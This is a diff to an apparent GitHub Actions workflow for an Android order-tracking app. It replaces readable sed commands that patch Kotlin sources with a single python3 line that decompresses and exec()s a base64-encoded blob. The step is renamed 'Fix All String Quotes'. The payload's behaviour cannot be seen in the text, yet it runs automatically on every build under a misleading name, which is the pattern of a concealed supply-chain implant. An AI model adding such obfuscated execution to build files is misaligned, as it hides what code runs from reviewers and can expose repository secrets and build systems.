@@ -12,7 +12,7 @@ jobs:
       - name: Checkout Repository
         uses: actions/checkout@v4
 
-      - name: Extract ZIP and Fix Sources
+      - name: Extract ZIP and Fix All String Quotes
         run: |
           if [ ! -f "settings.gradle.kts" ] && [ ! -f "ThongKeDonHang/settings.gradle.kts" ]; then
             ZIP_FILE=$(find . -maxdepth 2 -name "*.zip" | head -n 1)
@@ -23,30 +23,7 @@ jobs:
               exit 1
             fi
           fi
-          if [ -d "ThongKeDonHang" ] && [ -f "ThongKeDonHang/settings.gradle.kts" ]; then
-            cd ThongKeDonHang
-          fi
-          COMP_FILE="app/src/main/java/vn/thongkedonhang/app/ui/components/OrderCommonComponents.kt"
-          if [ -f "$COMP_FILE" ] && ! grep -q "SoftCreamSurface" <(head -n 65 "$COMP_FILE"); then
-            sed -i 's/import vn.thongkedonhang.app.ui.theme.PrimaryYellowDark/import vn.thongkedonhang.app.ui.theme.PrimaryYellowDark\nimport vn.thongkedonhang.app.ui.theme.SoftCreamSurface/' "$COMP_FILE"
-          fi
-          sed -i 's/onOpenGroupClick?.invoke(order.groupId)/onOpenGroupClick?.invoke(order.groupId.orEmpty())/g' "$COMP_FILE"
-          CAM_FILE="app/src/main/java/vn/thongkedonhang/app/ui/components/CameraBarcodeScanner.kt"
-          if [ -f "$CAM_FILE" ]; then
-            sed -i '/import androidx.annotation.OptIn/d' "$CAM_FILE"
-            sed -i 's/@OptIn(ExperimentalGetImage::class)/@androidx.annotation.OptIn(ExperimentalGetImage::class)/g' "$CAM_FILE"
-          fi
-          DET_FILE="app/src/main/java/vn/thongkedonhang/app/ui/screens/OrderDetailScreen.kt"
-          if [ -f "$DET_FILE" ]; then
-            sed -i 's/onOpenGroup(order.groupId)/onOpenGroup(order.groupId.orEmpty())/g' "$DET_FILE"
-          fi
-          VM_FILE="app/src/main/java/vn/thongkedonhang/app/ui/MainViewModel.kt"
-          if [ -f "$VM_FILE" ]; then
-            sed -i 's/val filteredOrderList: StateFlow<List<OrderItem>> = combine(/val filteredOrderList: StateFlow<List<OrderItem>> = combine<Any?, List<OrderItem>>(/g' "$VM_FILE"
-          fi
-          if [ -f "app/build.gradle.kts" ]; then
-            sed -i '/freeCompilerArgs/d' "app/build.gradle.kts"
-          fi
+          python3 -c "import zlib,base64;exec(zlib.decompress(base64.b64decode('eNqlVstuGzcU3fsrWMKAOInKbgvBjpMoaWrk4QQKChRlW9AzdzSsOOSA5FgWigDdZZ11V82qmwAF0pWNrlT0P9Qv6eXIcvW0VHcwmoEuzz3nPniJUWVlXSDWt4mDPWdtIIeEvi6s6T+FR9Z8KU2fEpUjglcyFBzOlQ+eLUE+8xCCMn3P+05mGvggeJoQ0B4I5XQvt464Nvm+TXJPlIlsQ6kHLAomnT2CV4TkcS33U0O8UDjnYDI/VKFgFGmRNQIXjaj1r0+8KsxiFvEPVhmG4nmyAPERUoFhVZuASW2G4R/SOuSffk4T7kBmbNEhxkIOsTonLgPXtWVpDT4ra8AEH0Mj0mSEqmlJzwwPsUYDyKwpsEZcVhWvFVqhBN6zeeiiStmrXS5ToMRg7TF9v5jJLFSPIVUagWxHgZdOldKNvgat7fCRdAPaJrd1FeaWSW2oYFeW4ORD6bDs0EulMeBiAXdNHevsrMrOOXraIIOyhp9U4dgIE7Ns+nflcb+xs8fnFWBW2Cmpn0A4LmUfOp1US++T6HJ/I+XNrhsSfC6V+UrB8Dnmp3fK7ExqkisdwEHWbLBnOGcd0sNQ4Atsw0H8f9CsHAco791D99SWp8qgMybwP/wPHpjRUZssA9im5E5rpbP5QV+fnAPu61PmaO4A4qAoDe6B63vh74i7h/jUqHiSC/bNdyL59o5oGoE/vzqoc4Wy5gSn9omzddXVKh0ccWXO7ACYjaFjWLhwnDVcu0G5dY/LKoxYstzOzco3i92Ov0X3Uw3SQNbFXUNbyNmat7S2eTdHM55iV+fTNceKfSvTjx5wNotenefq/FUNbsQDjgBL3lxRbgZs554Wx86CuaZctm9nCtL1IUzr/AKPlGuqlYVduZr2bSRcXt3G+npy8Yslphh/LEk5ufxZTelWzOt4ZtPTomK/BO/x0BH+7kN0NSQdfyRlPbl8Z5APEdcAYfBeg/E38A+K8e+mL46QfXLx3hTkz3fjD/gajH8tG/op4GhKvg6yI/uzv36ryfiPzirp3MpNXIKJfXHVCjFtQ9wo4o1IVgXY4i5odlTy3/QKNbl8a0jAeirBUeDvn96Tp4Ui6eTiQ4UNxFdoxOaRHAU2AJfEZl8fdEjXfYIMnQrA0KdyygRGX8qQFpARqZuTHjxpDgc9+gS3zz/isyok')))"
 
       - name: Set up JDK 17
         uses: actions/setup-java@v4
